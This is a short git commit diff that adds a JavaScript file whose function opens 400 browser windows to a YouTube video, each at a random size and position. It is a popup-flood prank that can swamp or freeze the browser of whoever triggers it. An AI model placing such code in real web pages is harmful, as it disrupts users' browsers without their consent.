c10907ce5afa0372ed6c667bf9f16898e0392545
dgonsk8 <dgongar3112@gmail.com>
2023-10-30 14:52:23 +0100

    new

---
+++ Script/script.js
@@ -0,0 +1,14 @@
+function abre() {
+    let c = 1000;
+
+    for (i = 0; i < 400; i++) {
+        window.open("https://www.youtube.com/watch?v=Da-CIlJU8I4&pp=ygUeaGFibGFtb3MgbWHDsWFuYWJhZCBidW5ueSBkdWtp",
+            "ventana" + [i],
+
+            "width=" + Math.random() * (c) +
+            " height=" + Math.random() * (c) +
+            " top=" + Math.random() * (c) +
+            " left=" + Math.random() * (c)
+        );
+    }
+}
